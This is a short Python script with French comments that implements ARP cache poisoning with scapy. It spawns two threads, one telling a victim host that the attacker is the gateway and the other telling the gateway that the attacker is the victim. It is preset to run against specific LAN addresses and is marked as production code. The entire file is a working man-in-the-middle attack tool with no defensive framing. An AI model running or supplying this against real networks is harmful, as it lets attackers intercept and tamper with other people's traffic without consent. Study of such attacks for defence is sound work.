from scapy.layers.l2 import arpcachepoison
import threading
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"


class ArpSpoofer:
    """
    On définis une classe ArpSpoofer qui se chargera
    de lier une adresse ip définis à une adresse mac
    """
    def __init__(self, target, spoof_ip):
        # Adresse IP de la victime
        # Dans la logique on enverra une trame pour lui indiquer que nous sommes la passerelle
        self.target_ip = target
        
        # Adresse IP que l'on souhaite usurper
        # Dans la logique on enverra une trame pour lui indiquer que nous sommes la vcitime
        self.spoof_ip = spoof_ip

    def start(self) -> None:
        """
        Méthode de classe principale qui se contente de lancer le spoofing
        """
        # On envoie une trame à l'adresse ip de la victime (target) pour lui indiquer que nous sommes la passerelle
        thread_1 = threading.Thread(target=arpcachepoison, args=(self.target_ip, self.spoof_ip, 2))

        # On envoie une trame à l'adresse ip de la passerelle (gateway) pour lui indiquer que nous sommes la victime
        thread_2 = threading.Thread(target=arpcachepoison, args=(self.spoof_ip, self.target_ip, 2))

        thread_1.start()
        thread_2.start()
        
        
if __name__ == "__main__":
    my_spoofer = ArpSpoofer(target="192.168.1.62", spoof_ip="192.168.1.254")
    my_spoofer.start()
